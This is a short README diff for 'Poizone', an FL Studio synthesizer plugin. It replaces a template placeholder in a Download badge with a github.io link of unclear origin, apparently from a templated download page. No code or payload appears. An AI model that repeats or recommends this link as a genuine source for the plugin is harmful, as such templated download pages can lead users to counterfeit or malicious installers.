@@ -2,7 +2,8 @@
 
 A lightweight subtractive synthesizer plugin designed for FL Studio users who want fast, punchy, and efficient sound creation. Poizone offers essential synthesis features with a clean interface, ideal for EDM producers and live performance setups.
 
-[![Download](https://img.shields.io/badge/Download-Poizone_for_FL_Studio-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Poizone_for_FL_Studio-blueviolet)](https://poizone-fl-studio-plugin.github.io/.github
+)
 
 ---
 
